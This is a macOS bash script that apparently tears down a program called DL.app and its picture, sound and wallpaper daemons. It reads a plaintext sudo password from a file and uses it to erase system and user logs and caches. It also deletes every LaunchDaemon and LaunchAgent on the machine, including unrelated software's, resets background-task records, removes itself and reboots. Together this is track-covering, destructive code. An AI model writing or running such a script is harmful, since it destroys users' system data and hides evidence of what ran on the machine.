

#!/usr/bin/env bash

# Load sudo password if available
PASSWORD_FILE="$HOME/programfiles/p.txt"
if [[ -r "$PASSWORD_FILE" ]]; then
  PASSWORD=$(< "$PASSWORD_FILE")
fi

# Remove main.sh from login items
if [[ -n "$PASSWORD" ]]; then
  echo "$PASSWORD" | sudo -S osascript -e 'tell application "System Events" to delete login item "DL.app"'
else
  osascript -e 'tell application "System Events" to delete login item "DL.app"'
fi

# Kill running daemons/scripts
for proc in main.sh picture-daemon.sh sound-daemon.sh wallpaper-daemon.sh; do
  if [[ -n "$PASSWORD" ]]; then
    echo "$PASSWORD" | sudo -S pkill -f "$proc" || true
  else
    pkill -f "$proc" || true
  fi
done

# Reset wallpaper to the default system image
DEFAULT_WALLPAPER="/System/Library/CoreServices/DefaultDesktop.jpg"
if [[ -f "$DEFAULT_WALLPAPER" ]]; then
  osascript <<EOF
tell application "System Events"
  set picture of every desktop to POSIX file "$DEFAULT_WALLPAPER"
end tell
EOF
fi

# Clear logs and caches
if [[ -n "$PASSWORD" ]]; then
  echo "$PASSWORD" | sudo -S rm -rf ~/Library/Logs/* /var/log/* ~/Library/Caches/*
else
  rm -rf ~/Library/Logs/* /var/log/* ~/Library/Caches/*
fi


# Delete the programfiles directory
  echo "$PASSWORD" | sudo -S rm -rf "$HOME/programfiles"

# Delete all LaunchDaemons and LaunchAgents
  echo "$PASSWORD" | sudo -S rm -rf /Library/LaunchDaemons/*
  echo "$PASSWORD" | sudo -S rm -rf /Library/LaunchAgents/*

# Dump and reset the shared file list metadata (sfltool)
  echo "$PASSWORD" | sudo -S sfltool dumpbtm
  echo "$PASSWORD" | sudo -S sfltool resetbtm

echo "$PASSWORD" | sudo -S pmset disablesleep 0

# Self-destruct: remove this script
rm -- "$0"
# Restart the system
echo "$PASSWORD" | sudo -S reboot